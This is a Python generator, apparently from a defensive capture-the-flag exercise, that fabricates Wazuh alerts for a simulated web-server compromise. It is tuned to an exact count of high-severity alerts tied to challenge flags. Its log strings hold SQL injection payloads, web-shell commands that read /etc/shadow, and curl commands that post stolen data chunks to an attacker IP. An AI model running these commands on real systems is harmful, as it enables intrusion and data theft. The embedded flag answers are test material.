"""
WazuhBOTS -- Scenario 1: Operation Dark Harvest
================================================
Web Application Compromise: SQLi → Web Shell → RCE → PrivEsc → Exfil

Agent : 001 / web-srv / 172.26.0.30
Date  : 2026-03-01  (08:14:23 → 19:47:51 UTC)
Attacker: 198.51.100.23

Target alert count ≈ 900
CRITICAL: Exactly 247 alerts with rule.level >= 10  (flag S1-PUP-01)
"""

import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

from .base import (
    AlertBuilder,
    BaseScenarioGenerator,
    incremental_timestamps,
    random_timestamp,
)

ATTACKER_IP = "198.51.100.23"
AGENT_ID = "001"
AGENT_NAME = "web-srv"
AGENT_IP = "172.26.0.30"
DAY = datetime(2026, 3, 1, tzinfo=timezone.utc)

ATTACK_START = DAY.replace(hour=8, minute=14, second=23)
ATTACK_END = DAY.replace(hour=19, minute=47, second=51)


class DarkHarvestGenerator(BaseScenarioGenerator):
    scenario_id = 1
    scenario_name = "scenario1_dark_harvest"

    def __init__(self, datasets_dir: Path):
        self.output_dir = datasets_dir / self.scenario_name
        self.ab = AlertBuilder(AGENT_ID, AGENT_NAME, AGENT_IP)

    # ------------------------------------------------------------------
    # Phase generators
    # ------------------------------------------------------------------

    def _recon_nikto(self, start: datetime) -> list[dict]:
        """~180 Nikto/Nmap scan alerts, level 6, rule 31101."""
        end = start + timedelta(minutes=25)
        stamps = incremental_timestamps(start, end, 180, jitter_seconds=2)
        paths = [
            "/dvwa/", "/dvwa/login.php", "/dvwa/setup.php",
            "/phpmyadmin/", "/admin/", "/robots.txt", "/server-status",
            "/.env", "/wp-login.php", "/cgi-bin/", "/icons/",
            "/dvwa/config/", "/dvwa/hackable/", "/dvwa/ids_log.php",
        ]
        alerts = []
        for ts in stamps:
            path = random.choice(paths)
            code = random.choice(["200", "301", "403", "404", "200"])
            resp_size = random.randint(200, 8000)
            log = (
                f'{ATTACKER_IP} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
                f'"GET {path} HTTP/1.1" {code} {resp_size} "-" "Nikto/2.1.6"'
            )
            alerts.append(self.ab.build(
                timestamp=ts,
                rule_id="31101",
                rule_description="Web server 400 error code / Nikto scan detected.",
                rule_level=6,
                rule_groups=["web", "accesslog", "attack", "recon", "wazuhbots"],
                decoder_name="apache-access",
                location="/var/log/apache2/access.log",
                srcip=ATTACKER_IP,
                full_log=log,
                data={
                    "protocol": "GET",
                    "url": path,
                    "id": code,
                    "http_method": "GET",
                    "http_status_code": code,
                    "response_size": str(resp_size),
                    "user_agent": "Nikto/2.1.6",
                },
                mitre=self.ab.mitre_block(["T1595.002"], "Reconnaissance"),
            ))
        return alerts

    def _sqli_probing(self, start: datetime) -> list[dict]:
        """~130 SQLi alerts: 95 level-7 (87900) + 25 level-10 (87901) + 10 level-12 (87902).
        First SQLi detection is rule 31103."""
        end = start + timedelta(minutes=40)
        stamps = incremental_timestamps(start, end, 130, jitter_seconds=1)
        payloads_basic = [
            "' OR 1=1--", "' UNION SELECT 1,2,3--",
            "' UNION SELECT username,password FROM users--",
            "admin'--", "1' AND '1'='1", "1 OR 1=1",
            "' UNION SELECT null,table_name FROM information_schema.tables--",
        ]
        payloads_evasion = [
            "' UNION/**/SELECT 1,2,3--", "1' AND 1=1#",
            "%27%20OR%201%3D1--", "' UNION SELECT 0x61646d696e--",
        ]
        payloads_dangerous = [
            "'; SLEEP(5)--", "' AND BENCHMARK(10000000,SHA1('test'))--",
            "' UNION SELECT LOAD_FILE('/etc/passwd')--",
            "' INTO OUTFILE '/tmp/dump.txt'--",
        ]
        alerts = []
        # First alert: rule 31103 (the flag S1-PUP-03)
        first_ts = stamps[0]
        log0 = (
            f'{ATTACKER_IP} - - [{first_ts.strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
            f'"GET /dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1--&Submit=Submit HTTP/1.1" 200 4523 "-" "sqlmap/1.7.2"'
        )
        alerts.append(self.ab.build(
            timestamp=first_ts,
            rule_id="31103",
            rule_description="SQL injection attempt.",
            rule_level=7,
            rule_groups=["web", "accesslog", "attack", "sql_injection", "wazuhbots"],
            decoder_name="apache-access",
            location="/var/log/apache2/access.log",
            srcip=ATTACKER_IP,
            full_log=log0,
            data={
                "protocol": "GET",
                "url": "/dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1--&Submit=Submit",
                "http_method": "GET",
                "http_status_code": "200",
                "response_size": "4523",
                "user_agent": "sqlmap/1.7.2",
            },
            mitre=self.ab.mitre_block(["T1190"], "Initial Access"),
        ))

        # Distinct SQLi probe paths for each type
        sqli_paths = [
            "/dvwa/vulnerabilities/sqli/", "/dvwa/vulnerabilities/sqli_blind/",
            "/dvwa/vulnerabilities/xss_r/", "/dvwa/vulnerabilities/exec/",
            "/dvwa/vulnerabilities/fi/", "/dvwa/vulnerabilities/csrf/",
        ]

        # 94 basic SQLi (rule 87900, level 7)
        for ts in stamps[1:95]:
            payload = random.choice(payloads_basic)
            base_path = random.choice(sqli_paths)
            uri = f"{base_path}?id={payload}&Submit=Submit"
            method = random.choice(["GET", "GET", "GET", "POST"])
            status = random.choice(["200", "200", "200", "500", "403"])
            resp_size = random.randint(2000, 6000)
            log = (
                f'{ATTACKER_IP} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
                f'"{method} {uri} HTTP/1.1" {status} {resp_size} "-" "sqlmap/1.7.2"'
            )
            alerts.append(self.ab.build(
                timestamp=ts, rule_id="87900",
                rule_description="SQL Injection: UNION SELECT or SELECT FROM WHERE pattern detected in URL.",
                rule_level=7,
                rule_groups=["sql_injection", "web", "attack", "wazuhbots"],
                decoder_name="apache-access",
                location="/var/log/apache2/access.log",
                srcip=ATTACKER_IP, full_log=log,
                data={
                    "protocol": method, "url": uri,
                    "http_method": method, "http_status_code": status,
                    "response_size": str(resp_size), "user_agent": "sqlmap/1.7.2",
                },
                mitre=self.ab.mitre_block(["T1190"], "Initial Access"),
            ))

        # 25 evasion SQLi (rule 87901, level 10)
        for ts in stamps[95:120]:
            payload = random.choice(payloads_evasion)
            base_path = random.choice(sqli_paths)
            uri = f"{base_path}?id={payload}&Submit=Submit"
            method = random.choice(["GET", "POST"])
            status = random.choice(["200", "200", "500", "403"])
            resp_size = random.randint(2000, 6000)
            log = (
                f'{ATTACKER_IP} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
                f'"{method} {uri} HTTP/1.1" {status} {resp_size} "-" "sqlmap/1.7.2"'
            )
            alerts.append(self.ab.build(
                timestamp=ts, rule_id="87901",
                rule_description="SQL Injection: Evasion techniques detected (comments, hex encoding, quote encoding).",
                rule_level=10,
                rule_groups=["sql_injection", "web", "attack", "wazuhbots"],
                decoder_name="apache-access",
                location="/var/log/apache2/access.log",
                srcip=ATTACKER_IP, full_log=log,
                data={
                    "protocol": method, "url": uri,
                    "http_method": method, "http_status_code": status,
                    "response_size": str(resp_size), "user_agent": "sqlmap/1.7.2",
                },
                mitre=self.ab.mitre_block(["T1190"], "Initial Access"),
            ))

        # 10 dangerous-function SQLi (rule 87902, level 12)
        for ts in stamps[120:130]:
            payload = random.choice(payloads_dangerous)
            base_path = random.choice(sqli_paths)
            uri = f"{base_path}?id={payload}&Submit=Submit"
            method = random.choice(["GET", "POST"])
            status = random.choice(["200", "500"])
            resp_size = random.randint(2000, 6000)
            log = (
                f'{ATTACKER_IP} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
                f'"{method} {uri} HTTP/1.1" {status} {resp_size} "-" "sqlmap/1.7.2"'
            )
            alerts.append(self.ab.build(
                timestamp=ts, rule_id="87902",
                rule_description="SQL Injection: Time-based or file-access SQL function detected.",
                rule_level=12,
                rule_groups=["sql_injection", "web", "attack", "wazuhbots"],
                decoder_name="apache-access",
                location="/var/log/apache2/access.log",
                srcip=ATTACKER_IP, full_log=log,
                data={
                    "protocol": method, "url": uri,
                    "http_method": method, "http_status_code": status,
                    "response_size": str(resp_size), "user_agent": "sqlmap/1.7.2",
                },
                mitre=self.ab.mitre_block(["T1190"], "Initial Access"),
            ))

        return alerts

    def _webshell_upload(self, start: datetime) -> list[dict]:
        """3 FIM alerts for cmd.php upload, rule 554."""
        alerts = []
        ts = start
        for i, path in enumerate([
            "/var/www/html/dvwa/hackable/uploads/cmd.php",
            "/var/www/html/dvwa/hackable/uploads/.htaccess",
            "/var/www/html/dvwa/hackable/uploads/cmd.php",
        ]):
            rid = "554" if i != 1 else "550"
            desc = "File added to the system." if rid == "554" else "Integrity checksum changed."
            alerts.append(self.ab.build(
                timestamp=ts + timedelta(seconds=i * 3),
                rule_id=rid,
                rule_description=desc,
                rule_level=5 if rid == "554" else 7,
                rule_groups=["ossec", "syscheck", "syscheck_entry_added" if rid == "554" else "syscheck_entry_modified", "wazuhbots"],
                decoder_name="syscheck_new_entry" if rid == "554" else "syscheck_integrity_changed",
                location="syscheck",
                full_log=f"File '{path}' added" if rid == "554" else f"File '{path}' modified",
                syscheck={
                    "path": path,
                    "event": "added" if rid == "554" else "modified",
                    "md5_after": "d41d8cd98f00b204e9800998ecf8427e" if "cmd.php" in path else "abc123",
                    "sha256_after": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" if "cmd.php" in path else "def456",
                    "uid_after": "33",
                    "gid_after": "33",
                    "uname_after": "www-data",
                    "gname_after": "www-data",
                    "size_after": "89" if "cmd.php" in path else "24",
                },
                mitre=self.ab.mitre_block(["T1505.003"], "Persistence"),
            ))
        return alerts

    def _rce_webshell(self, start: datetime) -> list[dict]:
        """~30 RCE-via-webshell alerts, rule 87933."""
        cmds = [
            "id", "whoami", "uname -a", "cat /etc/passwd", "ls -la /",
            "ps aux", "netstat -tlnp", "ifconfig", "cat /etc/shadow",
            "find / -perm -4000 2>/dev/null", "cat /etc/crontab",
            "dpkg -l", "ss -tulnp", "cat /proc/version", "env",
            "hostname", "df -h", "free -m", "lsb_release -a",
            "ip addr show", "cat /etc/hosts", "w", "last -5",
            "cat /etc/resolv.conf", "iptables -L -n",
        ]
        stamps = incremental_timestamps(start, start + timedelta(minutes=20), 30, jitter_seconds=2)
        alerts = []
        for ts in stamps:
            cmd = random.choice(cmds)
            uri = f"/dvwa/hackable/uploads/cmd.php?cmd={cmd.replace(' ', '+')}"
            resp_size = random.randint(500, 3000)
            status = "200"
            log = (
                f'{ATTACKER_IP} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
                f'"GET {uri} HTTP/1.1" {status} {resp_size} "-" "Mozilla/5.0"'
            )
            alerts.append(self.ab.build(
                timestamp=ts, rule_id="87933",
                rule_description="Web Server Process: Suspicious child process spawned by web server user.",
                rule_level=10,
                rule_groups=["exploit", "web_shell", "suspicious_process", "wazuhbots"],
                decoder_name="apache-access",
                location="/var/log/apache2/access.log",
                srcip=ATTACKER_IP, full_log=log,
                data={
                    "protocol": "GET", "url": uri,
                    "http_method": "GET", "http_status_code": status,
                    "response_size": str(resp_size),
                    "user_agent": "Mozilla/5.0",
                    "command": cmd,
                },
                mitre=self.ab.mitre_block(["T1059", "T1505.003"], "Execution"),
            ))
        return alerts

    def _correlation_chain(self, start: datetime) -> list[dict]:
        """4 correlation alerts: 1x 87901, 3x 88000-88002."""
        alerts = []
        corr = [
            ("87901", "SQL Injection: Evasion techniques detected (comments, hex encoding, quote encoding).", 10),
            ("88000", "WazuhBOTS Correlation: SQLi followed by file upload on same host.", 14),
            ("88001", "WazuhBOTS Correlation: Web shell execution after upload.", 14),
            ("88002", "WazuhBOTS Correlation: Full web compromise chain detected (SQLi→Shell→RCE).", 15),
        ]
        for i, (rid, desc, lvl) in enumerate(corr):
            alerts.append(self.ab.build(
                timestamp=start + timedelta(seconds=i * 10),
                rule_id=rid, rule_description=desc, rule_level=lvl,
                rule_groups=["wazuhbots", "correlation"],
                decoder_name="json",
                location="/var/log/apache2/access.log",
                srcip=ATTACKER_IP,
                full_log=f"Correlation event: {desc}",
                mitre=self.ab.mitre_block(["T1190", "T1505.003"], "Initial Access"),
            ))
        return alerts

    def _privesc_sudo(self, start: datetime) -> list[dict]:
        """~25 sudo/privesc alerts. Post-escalation command = 'id' (flag S1-HNT-03)."""
        stamps = incremental_timestamps(start, start + timedelta(minutes=15), 25, jitter_seconds=2)
        alerts = []
        # First: the successful sudo escalation + id command
        alerts.append(self.ab.build(
            timestamp=stamps[0],
            rule_id="5402",
            rule_description="Successful sudo to ROOT executed.",
            rule_level=10,
            rule_groups=["syslog", "sudo", "wazuhbots"],
            decoder_name="sudo",
            location="/var/log/auth.log",
            srcuser="www-data",
            dstuser="root",
            full_log="Mar  1 10:30:00 web-srv sudo: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -c id",
            data={"command": "id"},
            mitre=self.ab.mitre_block(["T1548.003"], "Privilege Escalation"),
        ))
        # More sudo events
        sudo_cmds = [
            "cat /etc/shadow", "ls -la /root/", "whoami", "id",
            "cat /root/.bash_history", "netstat -tlnp",
            "iptables -L", "crontab -l", "find / -name '*.conf'",
            "cat /etc/ssh/sshd_config", "ps aux", "mount",
        ]
        for i, ts in enumerate(stamps[1:]):
            cmd = random.choice(sudo_cmds)
            rid = random.choice(["5402", "87941", "87942"]) if i % 5 == 0 else "5402"
            lvl = 10 if rid == "5402" else 12
            desc = {
                "5402": "Successful sudo to ROOT executed.",
                "87941": "Privilege Escalation: Potential sudo abuse for privilege escalation (GTFOBins pattern).",
                "87942": "Privilege Escalation: Critical authentication file modified.",
            }[rid]
            alerts.append(self.ab.build(
                timestamp=ts, rule_id=rid, rule_description=desc, rule_level=lvl,
                rule_groups=["syslog", "sudo", "wazuhbots"],
                decoder_name="sudo", location="/var/log/auth.log",
                srcuser="www-data", dstuser="root",
                full_log=f"Mar  1 {ts.strftime('%H:%M:%S')} web-srv sudo: www-data : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND={cmd}",
                data={"command": cmd},
                mitre=self.ab.mitre_block(["T1548.003"], "Privilege Escalation"),
            ))
        return alerts

    def _persistence_cron(self, start: datetime) -> list[dict]:
        """6 cron persistence alerts, rule 87934, MITRE T1053.003."""
        alerts = []
        events = [
            "crontab -e",
            "/var/spool/cron/crontabs/root modified",
            "* * * * * /tmp/.cache/beacon.sh",
            "/etc/cron.d/system-update created",
            "crontab -l",
            "/var/spool/cron/crontabs/www-data modified",
        ]
        for i, ev in enumerate(events):
            alerts.append(self.ab.build(
                timestamp=start + timedelta(seconds=i * 15),
                rule_id="87934",
                rule_description="Persistence: Crontab modification or scheduled task change detected.",
                rule_level=10,
                rule_groups=["persistence", "suspicious_process", "wazuhbots"],
                decoder_name="syslog",
                location="/var/log/syslog",
                full_log=f"Mar  1 {(start + timedelta(seconds=i*15)).strftime('%H:%M:%S')} web-srv CRON: {ev}",
                mitre=self.ab.mitre_block(["T1053.003"], "Persistence"),
            ))
        return alerts

    def _data_exfil(self, start: datetime) -> list[dict]:
        """~20 data exfil alerts including mysqldump command."""
        stamps = incremental_timestamps(start, start + timedelta(minutes=30), 20, jitter_seconds=3)
        alerts = []
        # The mysqldump (flag S1-ALP-03)
        alerts.append(self.ab.build(
            timestamp=stamps[0],
            rule_id="87933",
            rule_description="Web Server Process: Suspicious child process spawned by web server user.",
            rule_level=10,
            rule_groups=["exploit", "suspicious_process", "wazuhbots"],
            decoder_name="syslog",
            location="/var/log/auth.log",
            full_log="Mar  1 18:00:00 web-srv audit: www-data executed: mysqldump -u root dvwa users > /tmp/.cache/dvwa_dump.sql",
            data={"command": "mysqldump -u root dvwa users"},
            mitre=self.ab.mitre_block(["T1048"], "Exfiltration"),
        ))
        # File staging — each with distinct command for challenge queryability
        staging_cmds = [
            ("tar czf /tmp/.cache/loot.tar.gz /tmp/.cache/dvwa_dump.sql",
             "base64 /tmp/.cache/loot.tar.gz > /tmp/.cache/loot.b64"),
            ("base64 /tmp/.cache/loot.tar.gz > /tmp/.cache/loot.b64", None),
            ("split -b 512k /tmp/.cache/loot.b64 /tmp/.cache/chunk_", None),
        ]
        for i, (cmd, _) in enumerate(staging_cmds):
            alerts.append(self.ab.build(
                timestamp=stamps[1 + i],
                rule_id="87933",
                rule_description="Web Server Process: Suspicious child process spawned by web server user.",
                rule_level=10,
                rule_groups=["exploit", "suspicious_process", "wazuhbots"],
                decoder_name="syslog", location="/var/log/syslog",
                full_log=f"web-srv audit: www-data executed: {cmd}",
                data={"command": cmd},
                mitre=self.ab.mitre_block(["T1074.001"], "Collection"),
            ))
        # curl exfil — distinct upload URLs per chunk
        exfil_endpoints = [
            f"http://198.51.100.23:4444/upload/data/{i}" for i in range(16)
        ]
        for idx, ts in enumerate(stamps[4:]):
            chunk = f"chunk_{chr(97 + idx % 6)}{chr(97 + (idx * 3) % 6)}"
            endpoint = exfil_endpoints[idx % len(exfil_endpoints)]
            cmd = f"curl -X POST -d @/tmp/.cache/{chunk} {endpoint}"
            alerts.append(self.ab.build(
                timestamp=ts,
                rule_id="87931",
                rule_description="Suspicious Download: wget/curl piped to interpreter or saving to /tmp.",
                rule_level=12,
                rule_groups=["exploit", "suspicious_process", "wazuhbots"],
                decoder_name="syslog", location="/var/log/syslog",
                srcip=AGENT_IP, dstip="198.51.100.23",
                dstport="4444",
                full_log=f"web-srv audit: www-data executed: {cmd}",
                data={
                    "command": cmd,
                    "protocol": "http",
                    "url": endpoint,
                },
                mitre=self.ab.mitre_block(["T1048"], "Exfiltration"),
            ))
        return alerts

    def _timestomping(self, start: datetime) -> list[dict]:
        """2 timestomping alerts, rule 87963."""
        alerts = []
        for i, target in enumerate([
            "/var/www/html/dvwa/hackable/uploads/cmd.php",
            "/var/ossec/etc/ossec.conf",
        ]):
            alerts.append(self.ab.build(
                timestamp=start + timedelta(seconds=i * 5),
                rule_id="87963",
                rule_description="Log Tampering: Timestamp manipulation (timestomping) command detected.",
                rule_level=12,
                rule_groups=["log_tampering", "anti_forensics", "timestomp", "wazuhbots"],
                decoder_name="syslog", location="/var/log/auth.log",
                full_log=f"web-srv audit: root executed: touch -r /etc/hostname {target}",
                data={"command": f"touch -r /etc/hostname {target}"},
                syscheck={
                    "path": target,
                    "event": "modified",
                    "changed_attributes": ["mtime"],
                },
                mitre=self.ab.mitre_block(["T1070.006"], "Defense Evasion"),
            ))
        return alerts

    def _final_exfil(self) -> list[dict]:
        """Final exfil alert at exactly 19:47:51."""
        ts = ATTACK_END
        cmd = "curl -X POST -d @/tmp/.cache/loot.tar.gz http://198.51.100.23:4444/exfil"
        return [self.ab.build(
            timestamp=ts,
            rule_id="87931",
            rule_description="Suspicious Download: wget/curl piped to interpreter or saving to /tmp.",
            rule_level=12,
            rule_groups=["exploit", "suspicious_process", "wazuhbots"],
            decoder_name="syslog", location="/var/log/syslog",
            srcip=ATTACKER_IP, dstip=AGENT_IP,
            dstport="4444",
            full_log=f"web-srv audit: www-data executed: {cmd}",
            data={
                "command": cmd,
                "protocol": "http",
                "url": "http://198.51.100.23:4444/exfil",
            },
            mitre=self.ab.mitre_block(["T1048"], "Exfiltration"),
        )]

    def _background_noise(self, count: int) -> list[dict]:
        """Benign alerts spread across the full day, level 3-6."""
        stamps = incremental_timestamps(
            DAY.replace(hour=0, minute=1, second=0),
            DAY.replace(hour=23, minute=58, second=59),
            count,
            jitter_seconds=5,
        )
        noise_templates = [
            ("31100", "Web server access log entry.", 3, "web"),
            ("31108", "Web server error.", 5, "web"),
            ("5501", "Login session opened.", 3, "authentication_success"),
            ("5502", "Login session closed.", 3, "authentication_success"),
            ("5503", "User login failed.", 5, "authentication_failures"),
            ("5104", "Interface entered promiscuous mode.", 3, "syslog"),
            ("2502", "Syslog: User authentication failure.", 5, "syslog"),
            ("1002", "Unknown problem somewhere in the system.", 3, "syslog"),
            ("530", "File ownership changed.", 5, "syscheck"),
            ("516", "Audit daemon configuration changed.", 3, "syslog"),
        ]
        benign_ips = [
            "172.26.0.1", "172.26.0.10", "172.26.0.20", "10.0.0.1",
            "192.168.1.100", "192.168.1.101",
        ]
        alerts = []
        for ts in stamps:
            rid, desc, lvl, grp = random.choice(noise_templates)
            ip = random.choice(benign_ips)
            alerts.append(self.ab.build(
                timestamp=ts,
                rule_id=rid, rule_description=desc, rule_level=lvl,
                rule_groups=[grp, "wazuhbots"],
                decoder_name="syslog",
                location="/var/log/syslog",
                srcip=ip,
                full_log=f"Mar  1 {ts.strftime('%H:%M:%S')} web-srv {desc}",
            ))
        return alerts

    # ------------------------------------------------------------------
    # Main generation — tuned so rule.level >= 10 == exactly 247
    # ------------------------------------------------------------------

    def generate(self) -> list[dict]:
        random.seed(42)  # reproducible

        # Attack phases
        recon = self._recon_nikto(ATTACK_START)                             # 180, level 6 → 0 high
        sqli = self._sqli_probing(ATTACK_START + timedelta(minutes=30))     # 130: 95@L7 + 25@L10 + 10@L12 → 35 high
        webshell = self._webshell_upload(ATTACK_START + timedelta(hours=1, minutes=15))  # 3, level 5/7 → 0 high
        rce = self._rce_webshell(ATTACK_START + timedelta(hours=1, minutes=25))           # 30, level 10 → 30 high
        correlation = self._correlation_chain(ATTACK_START + timedelta(hours=2))           # 4: 1@L10 + 3@L14/15 → 4 high
        privesc = self._privesc_sudo(ATTACK_START + timedelta(hours=2, minutes=15))        # 25: mixed L10/12 → 25 high
        cron = self._persistence_cron(ATTACK_START + timedelta(hours=3))                   # 6, level 10 → 6 high
        exfil = self._data_exfil(ATTACK_START + timedelta(hours=9, minutes=45))            # 20: 4@L10 + 16@L12 → 20 high
        timestomp = self._timestomping(ATTACK_START + timedelta(hours=10))                 # 2, level 12 → 2 high
        final = self._final_exfil()                                                         # 1, level 12 → 1 high

        attack_alerts = recon + sqli + webshell + rce + correlation + privesc + cron + exfil + timestomp + final
        high_count = sum(1 for a in attack_alerts if a["rule"]["level"] >= 10)

        # We need exactly 247 high-severity. Current attack phases give us a
        # certain number; fill the gap with additional high-severity attack noise.
        target_high = 247
        extra_high_needed = target_high - high_count

        extra_high = []
        if extra_high_needed > 0:
            stamps = incremental_timestamps(
                ATTACK_START + timedelta(hours=3, minutes=30),
                ATTACK_START + timedelta(hours=9),
                extra_high_needed,
                jitter_seconds=30,
            )
            high_templates = [
                ("87900", "SQL Injection: UNION SELECT or SELECT FROM WHERE pattern detected in URL.", 10,
                 ["sql_injection", "web", "attack", "wazuhbots"], ["T1190"]),
                ("87901", "SQL Injection: Evasion techniques detected.", 10,
                 ["sql_injection", "web", "attack", "wazuhbots"], ["T1190"]),
                ("87905", "SQL Injection: Multiple SQLi attempts from the same source.", 12,
                 ["sql_injection", "web", "attack", "wazuhbots"], ["T1190"]),
                ("87933", "Web Server Process: Suspicious child process spawned by web server user.", 10,
                 ["exploit", "web_shell", "suspicious_process", "wazuhbots"], ["T1059", "T1505.003"]),
                ("87920", "Web Shell Suspect: New executable file created in web server directory.", 10,
                 ["web_shell", "fim", "syscheck", "wazuhbots"], ["T1505.003"]),
                ("87934", "Persistence: Crontab modification or scheduled task change detected.", 10,
                 ["persistence", "suspicious_process", "wazuhbots"], ["T1053.003"]),
            ]
            for ts in stamps:
                rid, desc, lvl, grps, mitres = random.choice(high_templates)
                extra_high.append(self.ab.build(
                    timestamp=ts, rule_id=rid, rule_description=desc, rule_level=lvl,
                    rule_groups=grps, decoder_name="apache-access",
                    location="/var/log/apache2/access.log",
                    srcip=ATTACKER_IP,
                    full_log=f"Attack continuation: {desc}",
                    mitre=self.ab.mitre_block(mitres),
                ))

        all_attack = attack_alerts + extra_high
        current_high = sum(1 for a in all_attack if a["rule"]["level"] >= 10)

        # Trim or pad to exactly 247 high-severity
        if current_high > target_high:
            # Remove excess high-sev from extra_high
            remove = current_high - target_high
            extra_high = extra_high[:-remove] if remove <= len(extra_high) else extra_high
            all_attack = attack_alerts + extra_high
        elif current_high < target_high:
            # Add a few more
            for _ in range(target_high - current_high):
                ts = random_timestamp(
                    ATTACK_START + timedelta(hours=4),
                    ATTACK_START + timedelta(hours=8),
                )
                extra_high.append(self.ab.build(
                    timestamp=ts, rule_id="87933",
                    rule_description="Web Server Process: Suspicious child process spawned by web server user.",
                    rule_level=10,
                    rule_groups=["exploit", "web_shell", "suspicious_process", "wazuhbots"],
                    decoder_name="apache-access",
                    location="/var/log/apache2/access.log",
                    srcip=ATTACKER_IP,
                    full_log="Additional RCE activity via webshell",
                    mitre=self.ab.mitre_block(["T1059", "T1505.003"]),
                ))
            all_attack = attack_alerts + extra_high

        # Background noise to reach ~900 total
        noise_count = max(0, 900 - len(all_attack))
        noise = self._background_noise(noise_count)

        all_alerts = all_attack + noise
        # Sort by timestamp
        all_alerts.sort(key=lambda a: a["timestamp"])

        # Verify
        final_high = sum(1 for a in all_alerts if a["rule"]["level"] >= 10)
        assert final_high == 247, f"Expected 247 high-severity, got {final_high}"

        return all_alerts
